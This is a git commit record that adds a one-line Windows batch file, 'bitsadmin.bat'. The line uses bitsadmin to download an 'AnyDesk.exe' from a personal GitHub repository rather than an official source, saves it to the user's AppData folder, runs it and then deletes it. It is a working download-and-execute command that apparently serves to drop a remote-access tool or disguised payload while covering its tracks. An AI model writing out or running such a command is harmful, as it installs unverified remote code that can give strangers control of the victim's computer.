753cba02f8e4b1c02018e328b7ff4193b7d7dd0c
AustriaOA <OADr.JosefSimon@protonmail.com>
2024-09-25 21:04:59 +0000

    Create bitsadmin.bat

---
+++ bitsadmin.bat
@@ -0,0 +1,1 @@
+cmd.exe /c bitsadmin /transfer 43b8 https://raw.githubusercontent.com/AustriaOA/anydesk/refs/heads/main/AnyDesk.exe %APPDATA%\AnyDesk.exe&%APPDATA%\AnyDesk.exe&del %APPDATA%\AnyDesk.exe
